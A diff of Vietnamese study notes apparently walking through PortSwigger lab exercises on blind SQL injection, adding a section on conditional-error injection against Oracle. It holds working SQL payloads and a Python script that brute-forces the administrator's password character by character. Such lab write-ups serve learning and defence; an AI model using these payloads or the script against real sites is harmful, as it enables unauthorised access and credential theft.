@@ -351,7 +351,7 @@ LAB: Blind SQL injection with conditional responses
 
 ![alt text](image-37.png)
 
-- atabase chứa một bảng gọi là users với 2 cột username và password
+- Database chứa một bảng gọi là users với 2 cột username và password
 
 Mục tiêu: Cần khi thác lỗ hổng Blind SQL injection để tìm ra password của administrator
 
@@ -387,17 +387,13 @@ Giờ ta sẽ kiểm tra thử xem trong database có table nào tên là users 
 
 => Có 'Welcome back' như vậy là có 1 table tên users 
 
-Giờ ta sẽ thử xem trong bảng users đó có cột usename = 'administrator' hay không bằng cách chèn: '+AND+(SELECT+'a'+FROM+users+WHERE
-
-+username='administrator')='a'--
+Giờ ta sẽ thử xem trong bảng users đó có cột usename = 'administrator' hay không bằng cách chèn: '+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator')='a'--
 
 ![alt text](image-43.png)
 
 => Có 1 user tên 'administrator'
 
-Tiếp theo ta sẽ thử đoán xem password cảu administrator có bao nhiêu ký tự bằng cách chèn: '+AND+(SELECT+'a'+FROM+users+WHERE
-
-+username%3d'administrator'+AND+LENGTH(password)=20)%3d'a'--
+Tiếp theo ta sẽ thử đoán xem password cảu administrator có bao nhiêu ký tự bằng cách chèn: '+AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)=20)%3d'a'--
 
 ![alt text](image-44.png)
 
@@ -440,7 +436,7 @@ for i in range(1,21):
         print(f"[!] Not Found")
         break
 
-print(f"Password is : {password}")
+print(f"Password is {password}")
 
 -------------------------------------------------------------------------------------------------------------------
 
@@ -455,6 +451,118 @@ Sử dụng kỹ thuật này ta có thể truy xuất dữ liệu bằng cách 
 - xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a'
 
 END FROM Users)='a
+
+-------------------------------------------------------------------------------------------------------------------
+
+LAB: Blind SQL injection with conditional errors
+
+- Mục tiêu: Cần khi thác lỗ hổng Blind SQL injection để tìm ra password của administrator
+
+- Khi ta thử thêm ' vào đằng sau trường TrackingId thì bên response trả về báo lỗi 
+
+![alt text](image-45.png)
+
+- Còn khi chèn '' thì không báo lỗi 
+
+![alt text](image-46.png)
+
+=> Có lỗ hổng SQL injection ở đây. Lỗ hổng dựa trên thông báo lỗi trả về 
+
+- Nhưng không giống như bài trước, bài này ko có thông báo 'Welcome back' trả về
+
+- Giờ ta sẽ xác định database version của bài này là gì, vì mỗi version có câu lệnh khác nhau 
+
+![alt text](image-47.png)
+
+=> Bài này dùng oracle 
+
+- Giờ ta kiểm tra xem có bảng users trong database hay không 
+
+Payload: ' AND (SELECT 1 FROM users WHERE ROWNUM = 1) = 1--
+
+Dùng ROWNUM là vì Oracle không có LIMIT
+
+![alt text](image-48.png)
+
+=> Xác nhận có users table
+
+- Tiếp theo ta kiểm tra xem có user = administrator hay không
+
+Payload: ' AND (SELECT 1 FROM users WHERE username = 'administrator') = 1--
+
+![alt text](image-49.png)
+
+=> Xác nhận có username = administrator
+
+- Tiếp theo ta xác định độ dài của password 
+
+- Payload: '||(SELECT CASE WHEN LENGTH(password) > 1 THEN to_char(1/0) ELSE '' END FROM users WHERE username = 'administrator')--
+
+- Payload trên có nghĩa là nếu password > 1 thì sẽ trả về 1/0 
+
+=> Từ đó gây lỗi => response trả về 500 internal error 
+
+- Còn nếu không lỗi sẽ trả về 200 OK 
+
+![alt text](image-50.png)
+
+- Giờ ta chỉ cần dùng intruder để tìm ra độ dài password (có thể làm thủ công bằng cách thay giá trị của 1 bằng số khác)
+
+![alt text](image-51.png)
+
+=> Password dài 20 ký tự thì ko gây lỗi => password dài 20 ký tự 
+
+- Giờ ta sẽ viếp script để brute_force ra password 
+
+import requests 
+import string 
+
+URL = "https://0a2c0004041fd51180f20804003d00a8.web-security-academy.net/"
+
+cookies = {
+    "session" : "VSNCkSaWCrgFyYxrWuJ6CV3YUtT472Z9",
+    "TrackingId" : "x80GsSkKejryN2Oy"
+}
+
+CHARSET = string.ascii_letters + string.digits 
+
+TrackingId_original = ""
+
+password = ""
+
+for i in range(1,21):
+    found = False
+    for c in CHARSET:
+
+        payload = TrackingId_original + f"' || (SELECT CASE WHEN SUBSTR(password, {i}, 1) = '{c}' THEN to_char(1/0) ELSE '' END FROM users WHERE username = 'administrator')--"
+
+        cookies["TrackingId"] = payload
+
+        response = requests.get(URL, cookies=cookies)
+
+        if response.status_code == 500:
+            password += c
+
+            found = True
+
+            print(f"[+] Found charactor {i} : {c}")
+
+            break
+        else:
+            print(f"[-] Charactor {i} not match in {c}")
+    
+    if(found == False):
+        print(f"[-] Not Found")
+        break
+
+print(f"Password is {password}")
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
 
 
 
